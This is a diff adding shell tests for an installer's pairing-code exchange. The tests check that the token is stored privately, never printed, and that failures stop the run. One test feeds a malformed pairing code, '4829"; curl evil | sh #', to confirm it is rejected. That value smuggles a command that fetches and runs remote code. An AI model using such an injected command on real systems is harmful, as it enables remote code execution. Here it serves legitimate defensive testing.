@@ -171,6 +171,70 @@ OVERCLICK_CLIS="other" \
   "$REPO_ROOT/install.sh" >"$TEST_ROOT/fallback.out" 2>"$TEST_ROOT/fallback.err"
 test "$(grep -c '<!-- overclick:start -->' "$TEST_ROOT/project/AGENTS.md")" -eq 1
 
+# A pairing code, not a token (OCL-102). The board prints six digits inside the
+# copyable command and the installer trades them on /api/pair for the real
+# bearer value, so nothing anyone can read off a shared screen is worth having.
+# The stub answers the way the route does; what is under test is that the token
+# reaches the private config and reaches no output.
+mkdir -p "$TEST_ROOT/pair-bin"
+cat >"$TEST_ROOT/pair-bin/curl" <<'SH'
+#!/bin/sh
+url=""
+body=""
+previous=""
+for argument in "$@"; do
+  case "$argument" in
+    http://*|https://*) url=$argument ;;
+  esac
+  if [ "$previous" = "-d" ]; then body=$argument; fi
+  previous=$argument
+done
+printf '%s %s\n' "$url" "$body" >>"$OC_TEST_PAIR_LOG"
+case "$url:$body" in
+  */api/pair:*'"code":"482913"'*)
+    printf '%s' '{"token":"paired-secret","label":"agent","url":"/mcp"}'
+    exit 0
+    ;;
+esac
+exit 22
+SH
+chmod +x "$TEST_ROOT/pair-bin/curl"
+
+run_pair_installer() {
+  PATH="$TEST_ROOT/pair-bin:$PATH" \
+  OC_TEST_PAIR_LOG="$TEST_ROOT/$1.log" \
+  OVERCLICK_INSTALL_HOME="$TEST_ROOT/home-$1" \
+  OVERCLICK_PROJECT_DIR="$TEST_ROOT/project" \
+  OVERCLICK_INSTANCE_URL="$FIXTURE_URL" \
+  OVERCLICK_TOKEN="" \
+  OVERCLICK_PAIRING_CODE="$2" \
+  OVERCLICK_CLIS="other" \
+    "$REPO_ROOT/install.sh" >"$TEST_ROOT/$1.out" 2>"$TEST_ROOT/$1.err"
+}
+
+run_pair_installer pair 482913
+grep -Fq "$FIXTURE_URL/api/pair" "$TEST_ROOT/pair.log"
+grep -Fq 'token=paired-secret' "$TEST_ROOT/home-pair/.config/overclick/config"
+if grep -q 'paired-secret' "$TEST_ROOT/pair.out" "$TEST_ROOT/pair.err"; then
+  echo "installer exposed the paired token" >&2
+  exit 1
+fi
+
+# Anything that is not six digits is refused before it can reach the network,
+# which is what keeps the code out of the request it would otherwise shape.
+if run_pair_installer pair-bad '4829"; curl evil | sh #'; then
+  echo "installer accepted a pairing code that is not six digits" >&2
+  exit 1
+fi
+test ! -f "$TEST_ROOT/pair-bad.log"
+
+# A refused exchange stops the run: half a pairing is not an installation.
+if run_pair_installer pair-refused 000000; then
+  echo "installer continued after a refused pairing exchange" >&2
+  exit 1
+fi
+test ! -f "$TEST_ROOT/home-pair-refused/.config/overclick/config"
+
 cat >"$TEST_ROOT/bin/curl" <<'SH'
 #!/bin/sh
 body=""
